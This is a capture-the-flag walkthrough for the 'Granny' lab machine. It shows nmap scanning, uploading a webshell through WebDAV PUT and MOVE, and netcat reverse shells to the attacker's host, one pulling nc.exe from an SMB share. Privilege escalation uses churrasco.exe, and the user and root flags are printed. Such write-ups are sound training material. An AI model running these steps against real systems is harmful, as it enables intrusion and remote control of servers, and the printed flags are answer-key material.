![Granny.PNG](/assets/Machines/Easy/Granny/Granny.png)


1. Send an ICMP echo request to machine's IP address.
```bash
┌──(root㉿est)-[/home/kali]
└─| ping -c 2 10.10.10.15
```


2. Scan open ports with **nmap**.
```bash
┌──(root㉿kali)-[/home/kali]
└─| nmap -p- --open -vv -sS --min-rate 5000 -Pn -n 10.10.10.15
```

**Output**
```bash
PORT   STATE SERVICE
80/tcp open  http
```

3. Search more information about web page
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Granny]
└─| nmap -sCV -p80 10.10.10.15 -oN version
```

**Output**
```bash
|_http-server-header: Microsoft-IIS/6.0
| http-webdav-scan: 
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
|   Server Date: Sat, 14 Jan 2023 17:16:16 GMT
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   Server Type: Microsoft-IIS/6.0
|_  WebDAV type: Unknown
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

* The service is **Internet Information Services**
* Some methods are exposed, this is so dangerous!

4. For upload a file  to web site you can use this method:
* **PUT:** `curl -s -X PUT http://10.10.10.15/<File name> -d @<File>`

5. Try to upload a file for testing
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Granny]
└─| cat test.txt   
This is a test file. :)
```

```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Granny]
└─| curl -s -X PUT http://10.10.10.15/test.txt -d @test.txt
```

File in website

* **URL:** `http://10.10.10.15/<file name>`

![test.PNG](/assets/Machines/Easy/Granny/test.PNG)


6. You can use `davtest` to testing files we can upload
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Granny]
└─| davtest -url http://10.10.10.15
```

**Output**
```bash
PUT     cfm     SUCCEED:        http://10.10.10.15/DavTestDir_CMZytYwXiihSU2/davtest_CMZytYwXiihSU2.cfm
PUT     html    SUCCEED:        http://10.10.10.15/DavTestDir_CMZytYwXiihSU2/davtest_CMZytYwXiihSU2.html
PUT     asp     FAIL
PUT     php     SUCCEED:        http://10.10.10.15/DavTestDir_CMZytYwXiihSU2/davtest_CMZytYwXiihSU2.php
PUT     jhtml   SUCCEED:        http://10.10.10.15/DavTestDir_CMZytYwXiihSU2/davtest_CMZytYwXiihSU2.jhtml
PUT     cgi     FAIL                                                           
PUT     pl      SUCCEED:        http://10.10.10.15/DavTestDir_CMZytYwXiihSU2/davtest_CMZytYwXiihSU2.pl
PUT     aspx    FAIL
PUT     txt     SUCCEED:        http://10.10.10.15/DavTestDir_CMZytYwXiihSU2/davtest_CMZytYwXiihSU2.txt
PUT     jsp     SUCCEED:        http://10.10.10.15/DavTestDir_CMZytYwXiihSU2/davtest_CMZytYwXiihSU2.jsp
PUT     shtml   FAIL
```

* **.aspx** files are generate automatically for the server, if can upload this types of files we can execute commands.


7. We don't upload .aspx files in this case we can upload a shell **.aspx** (In Kali: /usr/share/webshells/aspx/cmdasp.aspx) but, change the extension file like this:

```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Granny]
└─| curl -s -X PUT http://10.10.10.15/shell.txt -d @cmdasp.aspx
```

8. We can change the extension with other option **MOVE**
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Granny]
└─| curl -s -X MOVE -H "Destination:http://10.10.10.15/shell.aspx" http://10.10.10.15/shell.txt
```

9. Now, access final file and ...

![aps.PNG](/assets/Machines/Easy/Granny/aps.PNG)

10. To get a reverse shell we need [nc.exe](https://eternallybored.org/misc/netcat/)
    
First, create a smbserver to share nc.exe 
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Granny]
└─| impacket-smbserver Test $(pwd) -smb2support
```

Then, execute this command in webshell

* **Command:** `\\<Tun0 IP>\Test\nc.exe -e cmd <Tun0 IP> <Port>`


**Output**
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Granny]
└─# nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.29] from (UNKNOWN) [10.10.10.15] 1032
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

c:\windows\system32\inetsrv>whoami
whoami
nt authority\network service
```


---
---
---
### **Privileges Escalation** 💀

1. Search information about windows version

```bash
c:\windows\system32\inetsrv>systeminfo                                                                                                 
Host Name:GRANNY                                                 
OS Name: Microsoft(R) Windows(R) Server 2003, Standard Edition
```

2. Search about privileges

```bash
c:\windows\system32\inetsrv>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAuditPrivilege              Generate security audits                  Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled
```

3. Search for any exploit uses **SeImpersonatePrivilege** and **Windows Server 2003** [Exploit](https://binaryregion.wordpress.com/2021/08/04/privilege-escalation-windows-churrasco-exe/)

4. Download this executable and create againa a **smbserver** and download in target machine.


* To download in target machine
```cmd
C:\WINDOWS\Temp\Exploit>copy \\10.10.14.29\Test\churrasco.exe churrasco.exe
```

5. Execute this exploit 
```bash
C:\WINDOWS\Temp\Exploit>.\churrasco.exe -d "whoami"

nt authority\system
```

6. Execute a commando to get a reverse shell how autority\system
```bash
C:\WINDOWS\Temp\Exploit>.\churrasco.exe -d "\\10.10.14.29\Test\nc.exe -e cmd 10.10.14.29 4444"
```

**Output**
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Granny]
└─# rlwrap nc -lvnp 4444               
listening on [any] 4444 ...
connect to [10.10.14.29] from (UNKNOWN) [10.10.10.15] 1035
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

C:\WINDOWS\TEMP>whoami
whoami
nt authority\system
```

7. Cat user and root flag
* User flag
```cmd
C:\Documents and Settings>type Lakis\Desktop\user.txt
700c5dc163014e22b3e408f8703f67d1
```

* Root flag
```cmd
C:\Documents and Settings>type Administrator\Desktop\root.txt
aa4beed1c0584445ab463a6747bd06e9
```